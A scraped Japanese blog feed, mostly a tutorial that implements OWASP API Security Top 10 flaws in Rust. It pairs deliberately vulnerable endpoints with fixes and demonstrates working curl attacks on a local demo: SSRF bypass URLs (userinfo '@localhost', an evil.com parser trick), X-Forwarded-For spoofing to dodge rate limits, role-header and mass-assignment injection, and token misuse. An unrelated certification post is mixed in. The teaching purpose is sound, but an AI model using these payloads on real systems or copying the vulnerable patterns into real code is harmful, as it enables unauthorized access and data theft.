大量のデータを取得SSRFが発生しやすい機能この事件を見て「うちはそんな機能ないから大丈夫」と思うだろう。しかし、SSRFが発生する機能は意外と身近にある。以下のような機能はSSRFの温床になりやすい。URLプレビュー/OGP取得 - 「このURLのタイトルと画像を表示」Webhook送信 - 「指定されたURLにPOSTリクエストを送る」PDF生成 - 「このURLの内容をPDFにする」（ヘッドレスブラウザがURLを開く）画像のリサイズ/変換 - 「このURLの画像をサムネイルにする」インポート機能 - 「このURLからデータをインポート」どれも「ユーザーが指定したURLにアクセスする」という共通点がある。この「ユーザーが指定したURL」が問題だ。例えば、「URLを指定したらそのページの内容を取得する」機能があったとする。/// VULNERABLE: Fetches any URLasync fn vulnerable_fetch(Json(req): Json<FetchUrlRequest>) -> Result<String, AppError> {    let response = reqwest::get(&req.url).await?;    Ok(response.text().await?)}攻撃者は内部ネットワークのURLを指定する。curl -X POST http://localhost:8080/vulnerable/fetch \\\\     -d \'{\\"url\\":\\"http://localhost:8080/internal/secrets\\"}\'/internal/secrets は本来、外部からアクセスできない内部APIだ。しかし、サーバー自身が「localhost」にアクセスするのは許可されている。結果、攻撃者はサーバーを経由して機密情報を引き出す。サーバーは「言われたことを忠実に実行する」だけだ。それが悪意あるリクエストだとは気づかない。対策: 許可リストとプロトコル制限では、どうやってSSRFを防ぐのか。基本的な考え方は「信頼できるURLだけを許可する」ことだ。async fn secure_fetch(Json(req): Json<FetchUrlRequest>) -> Result<String, AppError> {    let url = Url::parse(&req.url)        .map_err(|_| AppError::BadRequest(\\"Invalid URL\\".to_string()))?;    // HTTPSのみ許可    if url.scheme() != \\"https\\" {        return Err(AppError::BadRequest(\\"Only HTTPS URLs are allowed\\".to_string()));    }    // 許可されたドメインのみ    let allowed_domains = [\\"api.example.com\\", \\"cdn.example.com\\"];    let host = url.host_str()        .ok_or_else(|| AppError::BadRequest(\\"Invalid host\\".to_string()))?;    if !allowed_domains.contains(&host) {        return Err(AppError::BadRequest(\\"Domain not in allowlist\\".to_string()));    }    // 許可リストを通過したURLのみ処理    // ...}「なんでも取ってくる」から「許可されたものだけ取ってくる」へ。自由度は下がるが、セキュリティは上がる。微妙な脆弱性：SSRFの巧妙なバイパス手法「許可リストでドメインをチェックしているから安全」と思っていないだろうか。残念ながら、SSRFは想像以上に狡猾だ。攻撃者は、許可されたドメインを経由して、内部ネットワークにアクセスする方法を探す。微妙な脆弱性 #1: リダイレクトを追跡してしまう/// 開発者の意図: 「最初のURLを検証すればOK」/// 現実: リダイレクト先は検証されていないasync fn subtle_redirect_ssrf(Json(req): Json<FetchUrlRequest>) -> Result<String, AppError> {    let parsed_url = Url::parse(&req.url)?;    // 最初のURLは検証する    if !ALLOWED_DOMAINS.contains(&parsed_url.host_str().unwrap()) {        return Err(AppError::BadRequest(\\"Domain not allowed\\".to_string()));    }    // BUG: リダイレクトを10回まで追跡する    let client = reqwest::Client::builder()        .redirect(reqwest::redirect::Policy::limited(10))        .build()?;    // 攻撃:    // 1. パートナーサイト webhook.partner.com を許可リストに追加    // 2. パートナーが webhook.partner.com/redirect?to=http://localhost/internal を設定    // 3. 最初は検証を通過、リダイレクトで内部サーバーにアクセス    let response = client.get(&req.url).send().await?;    Ok(response.text().await?)}パートナーサイトやCDNを許可リストに入れていて、そこにオープンリダイレクト（任意のURLにリダイレクトできる機能）があったら終わり。リダイレクト先も検証するか、リダイレクトを無効にするべきだ。微妙な脆弱性 #2: DNSリバインディング/// 開発者の意図: 「DNSで解決されたIPをチェックすれば内部アクセスを防げる」/// 現実: DNSの応答は変わりうるasync fn subtle_dns_rebinding(Json(req): Json<FetchUrlRequest>) -> Result<String, AppError> {    let host = Url::parse(&req.url)?.host_str().unwrap().to_string();    // 最初のDNS解決（ここでは外部IP）    let ips = tokio::net::lookup_host(format!(\\"{}:80\\", host)).await?;    for ip in ips {        if ip.ip().to_string().starts_with(\\"127.\\") {            return Err(AppError::BadRequest(\\"Internal IP blocked\\".to_string()));        }    }    // BUG: 実際のリクエスト時には別のDNS解決が行われる可能性    // 攻撃者のDNSサーバー:    // 1回目のクエリ → 1.2.3.4（外部IP、チェック通過）    // 2回目のクエリ → 127.0.0.1（内部IP！）    tokio::time::sleep(Duration::from_millis(100)).await;  // この間にDNSが変わる    let response = reqwest::get(&req.url).await?;    Ok(response.text().await?)}DNSリバインディング攻撃は、DNSの応答を時間差で変えることで検証をすり抜ける。DNSとは、ドメイン名（例：example.com）をIPアドレス（例：93.184.216.34）に変換する仕組みだ。攻撃者は自分のDNSサーバーを用意し、最初は外部IPを返し、2回目のクエリでは内部IP（127.0.0.1）を返すようにする。対策は「解決したIPを直接使う」か「DNSピンニング」（一度解決したIPを再利用する）を実装すること。微妙な脆弱性 #3: URLパーサーの差異を悪用/// 開発者の意図: 「URLをパースしてホストを検証」/// 現実: 検証時と実際のリクエスト時でパーサーが違うasync fn subtle_parser_differential(Json(req): Json<FetchUrlRequest>) -> Result<String, AppError> {    // url クレートでパース    let parsed_url = Url::parse(&req.url)?;    let host = parsed_url.host_str().unwrap();    if !ALLOWED_DOMAINS.contains(&host) {        return Err(AppError::BadRequest(\\"Domain not allowed\\".to_string()));    }    // BUG: reqwest内部のHTTPクライアントが別のパースをする可能性    // 攻撃例:    // \\"https://api.github.com@localhost/internal/secrets\\"    //   → url クレート: github.com がホスト    //   → 一部のHTTPクライアント: localhost がホスト    let response = reqwest::get(&req.url).await?;    Ok(response.text().await?)}URLの解釈は実装によって微妙に異なる。例えば、https://api.github.com@localhost/pathというURLを考えてみよう。あるパーサーはapi.github.comがホストだと解釈し、別のパーサーはlocalhostがホストだと解釈する。この差異を悪用して、検証をすり抜けることができる。微妙な脆弱性 #4: プロトコル/エンコーディングの罠/// 開発者の意図: 「エンコードされたURLもサポートしよう」/// 現実: 検証するURLとリクエストするURLが違うasync fn subtle_protocol_smuggling(Json(req): Json<EncodedUrlRequest>) -> Result<String, AppError> {    let url_to_validate = if req.decode_first.unwrap_or(false) {        // URLデコードしてから検証        naive_percent_decode(&req.url)    } else {        req.url.clone()    };    // デコード後のURLを検証    let parsed = Url::parse(&url_to_validate)?;    // ... validation ...    // BUG: オリジナルのURL（デコード前）でリクエスト！    let response = reqwest::get(&req.url).await?;  // ← url_to_validate じゃない！    Ok(response.text().await?)}検証に使うURLとリクエストに使うURLが一致していないと、検証をバイパスできる。「便利だから」と入力を加工するときは、必ず加工後の値を一貫して使うこと。動作確認：実際に脆弱性を突いてみるここまで、4つの脆弱性（API4: Rate Limit、API5: BFLA、API7: SSRF、そして前編で紹介したAPI1〜3）を解説してきた。でも、コードを読むだけでは「本当にこれで攻撃できるの？」という疑問が残るだろう。そこで、実際にcurlでリクエストを投げて、脆弱性が動作することを確認してみよう。「攻撃者の視点」を体験することで、防御の重要性が腑に落ちるはずだ。BOLA（API1）の動作確認# サーバー起動cargo run --release --bin bola-demo# Bobのトークンを取得BOB_TOKEN=$(curl -s http://localhost:8080/token/bob | jq -r .access_token)# 脆弱なエンドポイント：BobがAliceの注文を見れてしまうcurl -H \\"Authorization: Bearer $BOB_TOKEN\\" http://localhost:8080/vulnerable/orders/1# 結果: {\\"id\\":1,\\"user_id\\":\\"alice\\",\\"product\\":\\"Widget A\\",\\"amount\\":100,...}# → BobがAliceの注文情報を取得できた！# セキュアなエンドポイント：適切に拒否されるcurl -H \\"Authorization: Bearer $BOB_TOKEN\\" http://localhost:8080/orders/1# 結果: {\\"error\\":\\"Order 1 not found or access denied\\"}# Subtle脆弱性：クエリパラメータでuser_idを上書きcurl -H \\"Authorization: Bearer $BOB_TOKEN\\" \\"http://localhost:8080/subtle/orders/1?user_id=alice\\"# 結果: {\\"id\\":1,\\"user_id\\":\\"alice\\",\\"product\\":\\"Widget A\\",...}# → クエリパラメータでオーナーチェックをバイパス！Mass Assignment（API3）の動作確認# サーバー起動cargo run --release --bin mass-assignment-demo# 脆弱なエンドポイント：statusを注入curl -X POST http://localhost:8080/vulnerable/payments \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"user_id\\":\\"attacker\\",\\"amount\\":1000,\\"status\\":\\"approved\\"}\'# 結果: {\\"id\\":\\"...\\",\\"user_id\\":\\"attacker\\",\\"amount\\":1000,\\"status\\":\\"approved\\",...}# → 攻撃者がstatusを\\"approved\\"に設定できた！# セキュアなエンドポイント：statusは無視されるcurl -X POST http://localhost:8080/payments \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"user_id\\":\\"user\\",\\"amount\\":1000,\\"status\\":\\"approved\\"}\'# 結果: {\\"id\\":\\"...\\",\\"user_id\\":\\"user\\",\\"amount\\":1000,\\"status\\":\\"pending\\",...}# → statusはサーバー側で\\"pending\\"に設定される# Subtle脆弱性：serde(flatten)でHashMapに余分なフィールドが入るcurl -X POST http://localhost:8080/subtle/payments/flatten \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"user_id\\":\\"user\\",\\"amount\\":500,\\"status\\":\\"approved\\",\\"id\\":\\"my-custom-id\\"}\'# 結果: statusが\\"approved\\"、idも上書きされる可能性# → flatten + HashMapの危険性BFLA（API5）の動作確認# サーバー起動cargo run --release --bin bfla-demo# 一般ユーザーのトークンを取得USER_TOKEN=$(curl -s http://localhost:8080/token/user | jq -r .access_token)# 脆弱なエンドポイント：一般ユーザーでも管理者機能にアクセスcurl -H \\"Authorization: Bearer $USER_TOKEN\\" http://localhost:8080/vulnerable/admin# 結果: {\\"message\\":\\"Welcome to admin panel\\",\\"admin_data\\":{\\"total_revenue\\":567890.12,...}}# → 一般ユーザーが管理者データを取得！# セキュアなエンドポイント：適切に拒否curl -H \\"Authorization: Bearer $USER_TOKEN\\" http://localhost:8080/admin# 結果: {\\"error\\":\\"Admin permission required\\"}# Subtle脆弱性1：HTTPヘッダーのロールを信頼curl -H \\"Authorization: Bearer $USER_TOKEN\\" \\\\     -H \\"X-User-Role: admin\\" \\\\     http://localhost:8080/subtle/admin/role-in-header# 結果: アクセス成功！# → ヘッダーを追加するだけでadminになれる# Subtle脆弱性2：キャッシュされた権限チェックを信頼curl -H \\"Authorization: Bearer $USER_TOKEN\\" \\\\     \\"http://localhost:8080/subtle/admin/cached-check?permission_verified=true\\"# 結果: アクセス成功！# → クエリパラメータで権限チェックをバイパスSSRF（API7）の動作確認# サーバー起動cargo run --release --bin ssrf-demo# 脆弱なエンドポイント：内部サービスにアクセスcurl \\"http://localhost:8080/vulnerable/fetch?url=http://localhost:8080/internal/secrets\\"# 結果: {\\"secrets\\":[\\"DATABASE_URL=postgres://admin:password@db:5432\\",...]}# → 内部の機密情報を取得！# セキュアなエンドポイント：localhost は拒否curl \\"http://localhost:8080/fetch?url=http://localhost:8080/internal/secrets\\"# 結果: {\\"error\\":\\"Access to internal addresses is not allowed\\"}# Subtle脆弱性：URLパーサーの差異を悪用curl \\"http://localhost:8080/subtle/fetch/parser-diff?url=http://localhost%2523@evil.com/\\"# → 異なるパーサーで解釈が変わり、バイパス可能Rate Limit（API4）の動作確認# サーバー起動cargo run --release --bin rate-limit-demo# 正常なレート制限：5回でロックfor i in {1..6}; do  curl -X POST http://localhost:8080/login \\\\    -H \\"Content-Type: application/json\\" \\\\    -d \'{\\"email\\":\\"test@example.com\\",\\"password\\":\\"wrong\\"}\'  echo \\"\\"done# 6回目: {\\"error\\":\\"Account locked. Too many failed attempts.\\"}# Subtle脆弱性1：X-Forwarded-For でIPを偽装for i in {1..10}; do  curl -X POST http://localhost:8080/subtle/login/xff \\\\    -H \\"Content-Type: application/json\\" \\\\    -H \\"X-Forwarded-For: 10.0.0.$i\\" \\\\    -d \'{\\"email\\":\\"victim@example.com\\",\\"password\\":\\"attempt$i\\"}\'done# → 毎回異なるIPとしてカウントされ、ロックされない！# Subtle脆弱性2：メールアドレスの大文字小文字curl -X POST http://localhost:8080/subtle/login/case \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"email\\":\\"User@Example.COM\\",\\"password\\":\\"wrong\\"}\'# → user@example.com とは別のエントリとしてカウント# Subtle脆弱性3：タイミング攻撃# 存在するユーザー（高速レスポンス）time curl -X POST http://localhost:8080/subtle/login/timing \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"email\\":\\"admin@example.com\\",\\"password\\":\\"x\\"}\'# → ~10ms# 存在しないユーザー（遅いレスポンス）time curl -X POST http://localhost:8080/subtle/login/timing \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"email\\":\\"nobody@example.com\\",\\"password\\":\\"x\\"}\'# → ~110ms（意図的な遅延）# → レスポンス時間の差でユーザーの存在を推測可能！Broken Auth（API2）の動作確認# サーバー起動cargo run --release --bin broken-auth-demo# 期限切れトークンを取得EXPIRED_TOKEN=$(curl -s http://localhost:8080/token/expired | jq -r .access_token)# 脆弱なエンドポイント：期限切れトークンを受け入れるcurl -H \\"Authorization: Bearer $EXPIRED_TOKEN\\" \\\\     http://localhost:8080/vulnerable/validate# 結果: {\\"message\\":\\"Token accepted\\",\\"token_type\\":\\"expired\\"}# → 期限切れなのにアクセス成功！# セキュアなエンドポイント：適切に拒否curl -H \\"Authorization: Bearer $EXPIRED_TOKEN\\" \\\\     http://localhost:8080/validate# 結果: {\\"error\\":\\"Token validation failed: ExpiredSignature\\"}# Subtle脆弱性：nbf（not before）をスキップFUTURE_TOKEN=$(curl -s http://localhost:8080/token/future | jq -r .access_token)curl -H \\"Authorization: Bearer $FUTURE_TOKEN\\" \\\\     http://localhost:8080/subtle/validate/nbf-skip# 結果: まだ有効期間前なのにアクセス成功# → nbfのチェック漏れ動作確認のポイントこれらのテストで確認できる重要な点をまとめる。脆弱なエンドポイント vs セキュアなエンドポイント同じリクエストでも、実装によって結果が全く異なるセキュアな実装は「デフォルト拒否」の原則に従うSubtle脆弱性の危険性コードを見ただけでは問題に気づきにくい「動いているから大丈夫」では見逃すセキュリティテストで初めて発覚することが多い攻撃者の視点攻撃者は正常系だけでなく、エッジケースを狙うヘッダー追加、大文字小文字変換、URL エンコードなど「そんなリクエスト来ないでしょ」は通用しない全テストの実行20のセキュリティテストを一括で実行できる。./scripts/test_all.sh==========================================API Security Demo - Vulnerability TestsOWASP API Security Top 10==========================================[PASS] Vulnerable EP: Bob accessed Alice\'s order (HTTP 200)  ← 攻撃成功[PASS] Secure EP: Access denied (HTTP 404)                   ← 攻撃失敗...==========================================Test Results Summary==========================================PASS: 20FAIL: 0All security tests passed!「脆弱なエンドポイントで攻撃が成功すること」と「安全なエンドポイントで攻撃が失敗すること」の両方をテストしている。「攻撃が成功してPASS」というのは変な感じがするが、これは「脆弱性のデモとして正しく動作している」ことの確認だ。その他のデモobservability: 攻撃検知システムセキュリティ対策は「防ぐ」だけでは不十分だ。攻撃が起きたことを「検知する」仕組みも必要になる。なぜなら、完璧な防御は存在しないからだ。このデモでは、攻撃パターンを検知してログに記録する仕組みを体験できる。cargo run --release --bin observability-demoセキュリティメトリクス（攻撃の試行回数や種類などの統計情報）を収集し、攻撃パターン（SQLインジェクション、XSSなど）を検知してログ出力する。Prometheus（監視システム）等で収集して、ダッシュボードで監視する想定だ。security_test: 自動セキュリティテスト脆弱性の有無を自動的にテストするデモ。CI/CD（コードの変更があるたびに自動でテストやデプロイを行う仕組み）に組み込むイメージ。開発の早い段階でセキュリティ問題を発見できる。cargo run --release --bin security-test-democurl http://localhost:8080/test/run-allAPI6, 8, 9, 10を扱わない理由本記事ではOWASP API Security Top 10のうち、API6、API8、API9、API10を扱っていない。それぞれ理由がある。API6: Unrestricted Access to Sensitive Business Flowsowasp.orgビジネスロジックの悪用（大量購入、スパムアカウント作成など）に関する脆弱性。これは「コードの脆弱性」というより「ビジネスルールの実装漏れ」であり、汎用的なデモを作りにくい。実際のビジネス要件に依存するため、抽象的なサンプルコードでは本質を伝えにくい。API8: Security Misconfigurationowasp.org設定ミス（デバッグモードの本番有効化、不要なHTTPメソッド許可、CORSの過剰許可など）に関する脆弱性。これはコードではなくインフラ設定やデプロイ設定の問題であり、Rustのコードデモとして示すには適していない。設定ファイルやクラウド設定のベストプラクティス集として別途まとめる方が有用だろう。API9: Improper Inventory Managementowasp.orgAPIバージョン管理の不備（古いAPIの放置、ドキュメント化されていないエンドポイント）に関する脆弱性。これは運用・管理の問題であり、単一のコードデモでは再現しにくい。組織的なAPIガバナンスの話になる。API10: Unsafe Consumption of APIsowasp.orgサードパーティAPIからの応答を信頼しすぎる問題。外部APIとの連携をデモするには実際のサードパーティサービスが必要になり、自己完結型のデモとして構成しにくい。要するに、API1〜5とAPI7は「コードレベルで再現・修正できる脆弱性」であり、API6、8、9、10は「運用・設定・ビジネスロジックレベルの問題」という違いがある。本記事では前者に焦点を当てた。これらの脆弱性を学ぶにはAPI6、8、9、10を含む全ての脆弱性を体験したい場合は、以下の脆弱性学習プラットフォームを推奨する。OWASP Juice Shopowasp.org最も有名な脆弱性学習用Webアプリケーション。OWASP Top 10だけでなく、API Security Top 10の脆弱性も含む100以上のチャレンジがある。Dockerで簡単に起動でき、スコアボードで進捗を確認できる。crAPI (Completely Ridiculous API)owasp.orgAPI脆弱性に特化した学習プラットフォーム。Facebook、Uber、Shopifyなどで実際に発見された脆弱性をベースにしたチャレンジが含まれる。マイクロサービスアーキテクチャで構築されており、現代的なAPI構成を学べる。VAmPI (Vulnerable API)github.comFlaskで作られたシンプルな脆弱性API。OWASP API Top 10の脆弱性が含まれており、セキュリティツールのテストにも使える。Vulnerable REST API (2023 Edition)github.comNode.jsとReactで作られた脆弱性アプリケーション。OWASP API Security Top 10 2023版に対応しており、API6〜10を含む全ての脆弱性をカバーしている。APIsec Universitywww.apisecuniversity.comAPIセキュリティに特化した無料のオンライントレーニング。OWASP API Top 10の解説から実践的なペネトレーションテスト手法まで学べる。まとめ前編・後編を通じて、OWASP API Security Top 10のうち6つの脆弱性を体験してきた。セキュリティは「知っている」と「実感している」の間に大きな溝がある。このデモを作って、自分で攻撃を試して、初めて「あ、これ確かにヤバい」と腑に落ちた。ドキュメントを読むだけでは得られない理解だった。コードはGitHubで公開している。cargo run --release --bin bola-demoで起動して、実際に攻撃を試してみてほしい。最後に、冒頭の話に戻る。「認証してるから大丈夫でしょ」—この言葉を聞いたら、このデモのことを思い出してほしい。そして「認可は」と聞き返してほしい。認証は玄関のチェックに過ぎない。中に入った後、どの部屋に入れるかを制御するのが認可だ。参考リンクOWASP API Security Top 10 (2023)公式ドキュメント。owasp.orgOWASP API Security Projectプロジェクトのホームページ。owasp.org本記事のソースコードgithub.comAlice and Bob - WikipediaBobとAliceの歴史。en.wikipedia.orggovernor - Rust Rate Limiting Libraryレート制限の実装に使用。github.comCWE-918: Server-Side Request Forgery (SSRF)SSRFに関連するCWEエントリ。cwe.mitre.orgCWE-770: Allocation of Resources Without Limits or Throttlingレート制限不足に関連するCWEエントリ。cwe.mitre.orgCWE-285: Improper AuthorizationBFLAに関連するCWEエントリ。cwe.mitre.orgPortSwigger - Server-side request forgery (SSRF)SSRFの詳細な解説とラボ環境。portswigger.netOWASP Cheat Sheet - Authorization認可に関するベストプラクティス。cheatsheetseries.owasp.orgOWASP Cheat Sheet - Authentication認証に関するベストプラクティス。cheatsheetseries.owasp.orgCapital One Data Breach (2019)SSRFによる大規模情報漏洩事例。https://en.wikipedia.org/wiki/2019_Capital_One_data_breachen.wikipedia.orgAWS IMDSv2AWSメタデータサービスのセキュリティ強化。SSRF対策として重要。docs.aws.amazon.comSecurify弊社のプロダクトでもAPIセキュリティのチェックを一部行うことができるらしい。3-shake.com","isoDate":"2025-12-05T20:56:37.000Z","dateMiliSeconds":1764968197000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NVIDIA 認定資格奮闘記 ~Associate Generative AI Multimodal編~","link":"https://zenn.dev/akasan/articles/nvidia_nca_genm","contentSnippet":"今回はNVIDIAの認定資格であるAssociate Generative AI Multimodalを取得したので、その内容を共有しようと思います。 Associate Generative AI Multimodalとは？Associate Generative AI Multimodal（以下、NCA-GENM）は、テキスト、画像、音声といった様々なモダリティからデータを合成・解釈するAIシステムの設計、実装、管理に必要な基礎スキルを検証するエントリーレベルの資格です。https://www.nvidia.com/en-us/learn/certification/gene...","isoDate":"2025-12-05T11:03:22.000Z","dateMiliSeconds":1764932602000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"RustでOWASP API Security Top 10を体験する（前編）：認証・認可の基礎とデータ保護","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/05/104919","contentSnippet":"この記事は、Rust Advent Calendar 2025 5日目のエントリ記事です。はじめに先日、あるプロジェクトのコードレビューで「このエンドポイント、認証は通ってるけど認可は大丈夫か」と聞いたら、「認証してるから大丈夫でしょ」という返答が返ってきた。その瞬間、私の脳内では警報が鳴り響いた。これはあれだ。「鍵がかかってるから金庫は安全」と言いながら、金庫の中身を誰でも見られる状態にしているやつだ。認証（Authentication）と認可（Authorization）の違い。頭ではわかっていても、実際のコードでどう違うのか、どう危険なのかを体感したことがある人は意外と少ない。かくいう私も、セキュリティの本を読んで「ふーん」と思いながら、翌日には同じミスをやらかしていた口だ。そこで今回、OWASP API Security Top 10の脆弱性を実際に攻撃できる形でRustにより実装してみた。OWASPとは「Open Web Application Security Project」の略で、Webアプリケーションのセキュリティに関するオープンなコミュニティだ。彼らが発表する「Top 10」は、最も危険で頻繁に発生する脆弱性のランキングとして世界中の開発者に参照されている。「脆弱なエンドポイント」と「安全なエンドポイント」を並べて、攻撃がどう成功し、どう防げるのかを手を動かして確認できる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。なぜBobとAliceなのか初手で余談だがセキュリティの例でやたらと「BobがAliceのデータを〜」という話が出てくる。なぜこの2人なのか。これは1978年にRon Rivest、Adi Shamir、Leonard Adleman（RSA暗号のRSA）が書いた論文「A Method for Obtaining Digital Signatures and Public-Key Cryptosystems」に由来する。彼らは暗号通信の説明で「AさんがBさんにメッセージを送る」ではなく「AliceがBobにメッセージを送る」と書いた。AとBで始まる名前を選んだだけだが、これが定着した。その後、セキュリティの世界では登場人物が増えていった。AliceとBobは通信したい善良な2人（主人公）Eveは盗聴者（Eavesdropperから。悪役その1）Malloryは能動的攻撃者（Maliciousから。もっと悪い悪役）Trentは信頼できる第三者（Trustedから）CarolやCharlieは3人目の参加者が必要なときに登場つまり、BobとAliceは何十年も同じ役を演じ続けている。本記事でも、この伝統に従ってBobとAliceに登場してもらう。Bobには悪役を演じてもらうことになるが、本来のBobは悪い人ではない。「認可が不十分だと善良なBobでも悪いことができてしまう」というのが本質的な問題なのだ。en.wikipedia.orgなぜ「体験」が必要なのかセキュリティの勉強で一番難しいのは、「危険性を実感すること」だ。ドキュメントを読んで「BOLAは危険です」と書いてあっても、「へー、そうなんだ」で終わる。これは人間の性だ。交通事故のニュースを見ても「自分は大丈夫」と考えるのと同じで、実際にBobがAliceのデータを抜き取る瞬間を見ないと、その怖さは伝わらない。このデモを作った動機は単純で、自分が「あ、これ確かにヤバい」と冷や汗をかける教材が欲しかったからだ。本を読んで「なるほど」と思っても、3日後には忘れている。でも、自分の手で攻撃を成功させた経験は忘れない。ちなみに、このデモを作っている最中に「あれ、これ本番のコードにも似たようなのあったな...」と気づいて本当に冷や汗をかいた。勉強は大事。OWASP API Security Top 10 (2023) 一覧まず、OWASP API Security Top 10の全体像を把握しておこう。本記事では、このうち主要な脆弱性を実際にRustで実装して体験する。https://owasp.org/API-Security/editions/2023/en/0x11-t10/owasp.org リスク  説明  API1:2023 - Broken Object Level Authorization  APIはオブジェクト識別子を扱うエンドポイントを公開しがちで、オブジェクトレベルのアクセス制御の問題が広い攻撃対象となる。ユーザーからのIDを使ってデータソースにアクセスするすべての関数で、オブジェクトレベルの認可チェックを考慮すべき。  API2:2023 - Broken Authentication  認証メカニズムは不正に実装されることが多く、攻撃者が認証トークンを侵害したり、実装の欠陥を悪用して一時的または永続的に他のユーザーになりすますことを可能にする。  API3:2023 - Broken Object Property Level Authorization  このカテゴリはAPI3:2019の過度なデータ露出とAPI6:2019のMass Assignmentを統合し、根本原因であるオブジェクトプロパティレベルでの認可検証の欠如または不適切さに焦点を当てている。  API4:2023 - Unrestricted Resource Consumption  APIリクエストの処理にはネットワーク帯域、CPU、メモリ、ストレージなどのリソースが必要。成功した攻撃はサービス拒否や運用コストの増加につながる可能性がある。  API5:2023 - Broken Function Level Authorization  異なる階層、グループ、ロールを持つ複雑なアクセス制御ポリシーと、管理機能と通常機能の不明確な分離は、認可の欠陥につながりやすい。  API6:2023 - Unrestricted Access to Sensitive Business Flows  このリスクに脆弱なAPIは、自動化された方法で過度に使用された場合にビジネスを損なう可能性のある機能を補償せずにビジネスフローを公開している。  API7:2023 - Server Side Request Forgery  SSRFの欠陥は、APIがユーザー提供のURIを検証せずにリモートリソースを取得する際に発生する可能性がある。ファイアウォールやVPNで保護されていても、攻撃者がアプリケーションに細工されたリクエストを予期しない宛先に送信させることができる。  API8:2023 - Security Misconfiguration  APIとそれをサポートするシステムには通常、APIをよりカスタマイズ可能にするための複雑な構成が含まれている。ソフトウェアおよびDevOpsエンジニアがこれらの構成を見落としたり、セキュリティのベストプラクティスに従わない場合がある。  API9:2023 - Improper Inventory Management  APIは従来のWebアプリケーションよりも多くのエンドポイントを公開する傾向があり、適切で更新されたドキュメントが非常に重要。非推奨のAPIバージョンや公開されたデバッグエンドポイントなどの問題を軽減するために、ホストとデプロイされたAPIバージョンの適切なインベントリも重要。  API10:2023 - Unsafe Consumption of APIs  開発者はサードパーティAPIから受信したデータをユーザー入力よりも信頼する傾向があり、より弱いセキュリティ基準を採用しがち。APIを侵害するために、攻撃者はターゲットAPIを直接侵害しようとするのではなく、統合されたサードパーティサービスを狙う。 本記事で実際に体験できる脆弱性を挙げる。前編（本記事）ではAPI1 (BOLA)、API2 (Broken Authentication)、API3 (Mass Assignment)を扱う後編ではAPI4 (Rate Limit)、API5 (BFLA)、API7 (SSRF)を扱うデモの全体像このデモは9つのバイナリで構成されている。それぞれが独立したWebサーバーとして起動する。/token/{user_id} でテスト用JWTを取得（JWTとは「JSON Web Token」の略で、ユーザーの認証情報を安全にやり取りするためのトークン形式だ。ログイン後にサーバーから発行され、以降のリクエストで「私は認証済みのユーザーです」と証明するために使う）/vulnerable/... で脆弱なエンドポイントを叩く/... で安全なエンドポイントを叩くapi-security-demo/├── src/bin/│   ├── bola.rs              # BOLA: オブジェクトレベル認可の不備│   ├── bfla.rs              # BFLA: 機能レベル認可の不備│   ├── mass_assignment.rs   # Mass Assignment: 一括代入の脆弱性│   ├── broken_auth.rs       # Broken Auth: 認証の不備│   ├── rate_limit.rs        # Rate Limit: リソース消費制限の不備│   ├── ssrf.rs              # SSRF: サーバーサイドリクエストフォージェリ│   ├── jwt.rs               # JWT: トークン操作のデモ│   ├── observability.rs     # 攻撃検知システム│   └── security_test.rs     # 自動セキュリティテスト技術スタックはRust + axum（axumはRust用のWebフレームワークで、高速かつ型安全なAPIサーバーを構築できる）。Rust 2024エディションで書いている。前提条件試してみたい方は以下が必要だ。Rust 1.85以上（2024エディション対応）curl と jq（テスト用。curlはコマンドラインからHTTPリクエストを送るツール、jqはJSONデータを整形・抽出するツール）# リポジトリのクローンgit clone https://github.com/nwiizo/workspace_2025.gitcd workspace_2025/infrastructure/api-security-demo# ビルド（初回は依存関係のダウンロードで時間がかかる）cargo build --release実装アーキテクチャの詳細「デモを動かす」だけでなく「なぜこう実装したのか」を理解することで、自分のプロジェクトに応用できる。ここでは設計判断とその理由を詳しく説明する。プロジェクト構成api-security-demo/├── Cargo.toml              # Rust 2024エディション、依存関係定義├── src/│   ├── lib.rs              # ライブラリのエントリポイント│   ├── auth.rs             # JWT認証・認可ロジック│   ├── db.rs               # SQLiteデータベース操作│   ├── error.rs            # エラー型定義│   ├── models.rs           # データモデル定義│   └── bin/                # 各デモのバイナリ│       ├── bola.rs│       ├── bfla.rs│       └── ...└── scripts/    └── test_all.sh         # 全テスト実行スクリプト共通ロジックはsrc/配下にライブラリとして切り出し、各デモはsrc/bin/配下の独立したバイナリとして実装している。これにより以下のメリットがある。コードの再利用: 認証、DB操作、エラーハンドリングを全デモで共有単一責任: 各バイナリは1つの脆弱性カテゴリに集中独立した起動: cargo run --bin bola-demoで特定のデモだけ起動可能エラーハンドリング設計Rustらしいエラー設計を採用した。thiserrorクレートで列挙型エラーを定義し、axumのIntoResponseを実装した。use thiserror::Error;#[derive(Error, Debug)]pub enum AppError {    #[error(\\"Authentication required\\")]    Unauthorized,    #[error(\\"Access denied: {0}\\")]    Forbidden(String),    #[error(\\"Resource not found: {0}\\")]    NotFound(String),    #[error(\\"Invalid request: {0}\\")]    BadRequest(String),    #[error(\\"Rate limit exceeded\\")]    RateLimitExceeded,    #[error(\\"JWT error: {0}\\")]    JwtError(#[from] jsonwebtoken::errors::Error),    #[error(\\"Database error: {0}\\")]    DatabaseError(String),}なぜanyhow::Errorではなく独自のエラー型なのか。HTTPステータスコードの制御。エラーの種類によって401、403、404、429などを返し分けたいクライアントへのメッセージ制御。内部エラーの詳細は隠し、クライアント向けのメッセージだけ返したいコンパイル時の網羅性チェック。matchで全ケースを処理しているか確認できるIntoResponseの実装を見てみよう。impl IntoResponse for AppError {    fn into_response(self) -> Response {        let (status, error_message) = match &self {            AppError::Unauthorized => (StatusCode::UNAUTHORIZED, self.to_string()),            AppError::Forbidden(msg) => (StatusCode::FORBIDDEN, msg.clone()),            AppError::NotFound(msg) => (StatusCode::NOT_FOUND, msg.clone()),            AppError::BadRequest(msg) => (StatusCode::BAD_REQUEST, msg.clone()),            AppError::RateLimitExceeded => (StatusCode::TOO_MANY_REQUESTS, \\"Rate limit exceeded\\".to_string()),            // ...        };        let body = Json(json!({ \\"error\\": error_message }));        (status, body).into_response()    